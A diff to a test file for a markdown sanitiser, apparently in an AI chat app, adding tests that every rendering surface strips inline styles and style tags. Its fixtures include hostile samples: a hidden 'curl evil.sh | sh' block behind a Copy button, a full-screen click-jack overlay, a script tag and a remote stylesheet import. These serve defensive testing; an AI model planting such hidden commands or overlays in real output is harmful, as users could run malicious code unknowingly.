@@ -13,13 +13,26 @@
 //     talked into writing some. So the hostile input here is real markup with
 //     real payloads, not a smoke test. It lives INSIDE this fixture: nothing in
 //     this file touches a path outside the repo.
-import { describe, it, expect, afterEach, beforeEach } from 'vitest';
+import { describe, it, expect, afterEach, beforeAll, beforeEach } from 'vitest';
 import fs from 'fs';
 import path from 'path';
 import { act } from 'react';
 import { createRoot, Root } from 'react-dom/client';
 import { CSP_DEV, CSP_PROD } from '../../../shared/csp';
-import { Markdown, MARKED_OPTIONS, renderMarkdown, STREAMING_CARET } from './markdown';
+import { initI18nForTests } from '../i18n/test-i18n';
+import { createRendererRegistry } from '../bootstrap';
+
+import { renderFeedBlock } from '../extensibility/feed-render';
+import { FeedBlockDto } from './feed';
+import { decorateDocument, DecorationLabels } from './document-render';
+import { classifyHref } from './document-link';
+import {
+  Markdown,
+  MARKED_OPTIONS,
+  renderMarkdown,
+  SANITIZE_CONFIG,
+  STREAMING_CARET,
+} from './markdown';
 
 describe('renderMarkdown — the one pipeline', () => {
   it('renders ordinary markdown', () => {
@@ -187,6 +200,179 @@ describe('<Markdown>', () => {
     const el = mount(<Markdown text="<script>globalThis.__pwned = 1;</script>" streaming />);
     expect(el.querySelector('script')).toBeNull();
     expect(el.textContent).toContain('<script>');
+  });
+});
+
+describe('the style attribute: one profile, and every surface uses it (#436)', () => {
+  // The decision, pinned. `markdown.tsx` carries the reasoning and the corpus
+  // measurement behind it; what is executable is (a) the profile forbids
+  // `style`, (b) EVERY surface that renders markdown goes through that profile,
+  // and (c) nothing legitimate was lost by it.
+  //
+  // (b) is the point. The bug this closes was not "the feed allows styles" — it
+  // was that the viewer stripped them in a pass of its own, so one exported
+  // constant meant two effective profiles, and only one of them was written
+  // down. A surface added later that renders markdown its own way makes this
+  // table red rather than making a third.
+
+  // Inline styles as they actually arrive: raw embedded markup in a file or a
+  // reply we did not write. Each is a shape with teeth, not a smoke test.
+  const styled: Array<[string, string]> = [
+    ['a colour that outranks the theme', '<span style="color:red">unreadable on daylight</span>'],
+    [
+      'a click-jack over the app chrome',
+      '<div style="position:fixed;inset:0;z-index:9999">gotcha</div>',
+    ],
+    ['a hidden block behind a Copy button', '<pre style="display:none">curl evil.sh | sh</pre>'],
+    ['an upper-case attribute name', '<p STYLE="color:red">x</p>'],
+    ['a style on a table cell', '<table><tr><td style="width:100%">c</td></tr></table>'],
+    ['a style smuggled through an image', '<img src="x.png" style="width:100vw;height:100vh">'],
+  ];
+
+  const LABELS: DecorationLabels = {
+    copy: 'Copy',
+    image: 'Image',
+    openInBrowser: 'Open in browser',
+    mediaOmitted: 'Media is not shown here',
+  };
+
+  // Torn down AFTER the assertions run: unmounting empties the host, and a host
+  // with no elements in it passes an "everything here is style-free" loop
+  // without reading a thing. That is not hypothetical — it is what the first cut
+  // of this block did, and only the mutation run (drop `FORBID_ATTR`, expect
+  // red) found it. Hence `expect(el.length).toBeGreaterThan(0)` below as well.
+  const mounted: Array<[Root, HTMLElement]> = [];
+
+  const mountInto = (el: React.ReactElement): HTMLElement => {
+    const host = document.createElement('div');
+    document.body.appendChild(host);
+    const r = createRoot(host);
+    act(() => r.render(el));
+    mounted.push([r, host]);
+    return host;
+  };
+
+  /** every surface, entered the way the app enters it, rendered into a host */
+  const surfaces: Array<[string, (markdown: string) => HTMLElement]> = [
+    [
+      'the feed',
+      (markdown) =>
+        // Through the real registry, exactly as FeedView does — not through
+        // `<Markdown>` directly, or the test would pass while the feed grew a
+        // renderer of its own.
+        mountInto(
+          renderFeedBlock(createRendererRegistry(), {
+            seq: 1,
+            kind: 'assistant',
+            sidechain: false,
+            text: markdown,
+          } as FeedBlockDto) as React.ReactElement
+        ),
+    ],
+    [
+      // Release notes are markdown from a GitHub release — the same `<Markdown>`
+      // the feed's fallback block uses, asserted separately because "the update
+      // dialog renders notes some other way" is the drift worth catching.
+      'the update dialog',
+      (markdown) => mountInto(<Markdown text={markdown} />),
+    ],
+    [
+      // Belt AND braces: `stripOurNamespace` removes `style` too, so this row
+      // would stay green if the profile lost `FORBID_ATTR`. It is here for the
+      // mapping — "the viewer renders through this pipeline" — not as the thing
+      // that detects the drift. The two rows above are, and a mutation run
+      // (2026-08-13, `FORBID_ATTR` dropped) put 12 of them red.
+      'the document viewer',
+      (markdown) => {
+        const { fragment } = decorateDocument(renderMarkdown(markdown), LABELS, (href) =>
+          classifyHref(href, '/home/dan/sb/docs/DESIGN.md')
+        );
+        const host = document.createElement('div');
+        host.append(fragment);
+        return host;
+      },
+    ],
+  ];
+
+  beforeAll(async () => {
+    // The feed's registry renders real blocks, and real blocks translate.
+    await initI18nForTests();
+  });
+
+  afterEach(() => {
+    for (const [r, host] of mounted.splice(0)) {
+      act(() => r.unmount());
+      host.remove();
+    }
+  });
+
+  it('the profile forbids it — one constant, not one pass per surface', () => {
+    expect(SANITIZE_CONFIG.FORBID_ATTR).toContain('style');
+    expect(renderMarkdown('<p style="color:red">x</p>')).not.toContain('style');
+  });
+
+  for (const [surface, draw] of surfaces) {
+    for (const [what, markdown] of styled) {
+      it(`${surface} strips ${what}`, () => {
+        const els = [...draw(markdown).querySelectorAll('*')];
+        // The surface rendered SOMETHING — see the note on `mounted`.
+        expect(els.length).toBeGreaterThan(0);
+        for (const el of els) expect(el.hasAttribute('style')).toBe(false);
+      });
+    }
+  }
+
+  it('and the content itself survives — it strips the attribute, not the element', () => {
+    const html = renderMarkdown('<span style="color:red">still here</span>');
+    expect(html).toContain('<span>');
+    expect(html).toContain('still here');
+  });
+
+  it('nothing markdown can emit is lost: GFM never writes an inline style', () => {
+    // The measurement that made STRIP safe, as a test. Table alignment is the
+    // one construct that looks like it needs `style` — `marked` renders it as
+    // `align`, which DOMPurify keeps — and this app ships no syntax highlighter
+    // writing colours inline. If a `marked` bump ever changes that, this goes
+    // red on the alignment assertion before anyone notices missing formatting.
+    const html = renderMarkdown(
+      [
+        '| left | centre | right |',
+        '|:-----|:------:|------:|',
+        '| 1 | 2 | 3 |',
+        '',
+        '- [x] done',
+        '- [ ] todo',
+        '',
+        '~~gone~~ and [a link](https://example.invalid/x)',
+        '',
+        '```js',
+        'const x = 1;',
+        '```',
+        '',
+        '> quote',
+        '',
+        '![pic](./local.png)',
+      ].join('\n')
+    );
+    expect(html).not.toContain('style=');
+    expect(html).toContain('align="center"');
+    expect(html).toContain('align="right"');
+    expect(html).toContain('type="checkbox"');
+    expect(html).toContain('<code');
+    expect(html).toContain('<del>gone</del>');
+    expect(html).toContain('src="./local.png"');
+  });
+
+  it('the <style> TAG was already out, and stays out', () => {
+    // Wider than the attribute: a stylesheet is not scoped to the block that
+    // carried it, so one from a document restyles the whole app. It falls to
+    // `USE_PROFILES: { html: true }` rather than to `FORBID_ATTR`, which is
+    // exactly the kind of thing that is true until a profile change makes it
+    // quietly untrue.
+    expect(renderMarkdown('<style>body{display:none}</style>')).not.toContain('<style');
+    expect(renderMarkdown('<style>@import url(https://evil.test/x.css);</style>')).not.toContain(
+      'evil.test'
+    );
   });
 });
 
